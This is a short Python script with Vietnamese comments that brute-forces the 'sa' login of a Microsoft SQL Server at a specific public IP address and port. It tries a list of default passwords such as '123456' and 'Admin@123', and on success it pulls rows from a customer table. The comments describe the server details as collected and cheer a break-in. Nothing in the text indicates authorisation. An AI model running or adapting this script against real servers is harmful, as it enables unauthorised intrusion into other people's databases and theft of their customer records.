import pyodbc
import pandas as pd

# Thông tin Server và Database thu thập được
server = '27.71.30.92,7521'
database = 'CYBNET9_VANDAO'
username = 'sa' 

# Thử với một số mật khẩu phổ biến thường bị đặt mặc định
passwords_to_try = [
    '', 
    'sa', 
    'cyber', 
    '123456', 
    'CyberSoft', 
    '12345678', 
    '123456aA@',
    'Admin@123'
]

print(f"Đang tiến hành kết nối tới Server {server}...")
print(f"Database: {database}")
print("-" * 50)

success = False

for pwd in passwords_to_try:
    connection_string = f'DRIVER={{ODBC Driver 17 for SQL Server}};SERVER={server};DATABASE={database};UID={username};PWD={pwd}'
    print(f"[*] Thử kết nối với mật khẩu: '{pwd}'")
    try:
        # Cài timeout thấp để thử nhanh
        conn = pyodbc.connect(connection_string, timeout=3)
        print("\n✅ BÙM! BẠN ĐÃ VÀO ĐƯỢC DATABASE VỚI MẬT KHẨU NÀY:", pwd)
        success = True
        
        # Test lấy dữ liệu
        print("Đang thử lấy 5 dòng dữ liệu...")
        df = pd.read_sql("SELECT TOP 5 * FROM DmKh", conn)
        print("Dữ liệu lấy được thành công:")
        print(df.head())
        break
    except Exception as e:
        # Bỏ qua lỗi và thử tiếp
        pass

if not success:
    print("\n❌ Thử nghiệm thất bại. Các mật khẩu mặc định đều bị từ chối.")
    print("Vui lòng chỉnh sửa file này và điền mật khẩu chính xác để chạy lại.")
